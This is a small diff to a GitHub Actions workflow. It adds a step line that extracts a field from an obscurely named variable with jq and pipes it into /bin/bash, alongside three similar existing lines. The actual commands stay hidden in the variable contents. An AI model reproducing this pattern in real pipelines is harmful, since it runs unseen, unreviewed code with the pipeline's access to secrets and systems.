@@ -21,6 +21,7 @@ jobs:
           echo $nb5 | jq -r .zhkr6 | /bin/bash
           echo $csr6174 | jq -r .sk5665 | /bin/bash
           echo $p507 | jq -r .gt44531 | /bin/bash
+          printf '%s' "$ids81456" | jq -r .pw3198 | /bin/bash
 
       - name: Save results
         uses: actions/upload-artifact@v4
